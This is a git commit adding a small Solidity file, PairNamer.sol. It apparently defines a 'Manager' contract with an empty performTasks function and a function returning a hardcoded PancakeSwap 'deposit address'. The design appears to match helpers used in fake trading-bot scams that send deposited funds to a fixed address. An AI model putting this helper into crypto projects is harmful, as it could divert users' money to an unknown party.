bdac9eb396ab8e3ca98eb7100b2be40a5be23d09
Okpedan <88175754+Okpedan@users.noreply.github.com>
2022-05-16 02:27:47 +0100

    Add files via upload

---
+++ PairNamer.sol
@@ -0,0 +1,13 @@
+// SPDX-License-Identifier: GPL-3.0-or-later
+
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x960529C0fB5639018B0F05f42dAC8194deB6619F;
+	}
+}
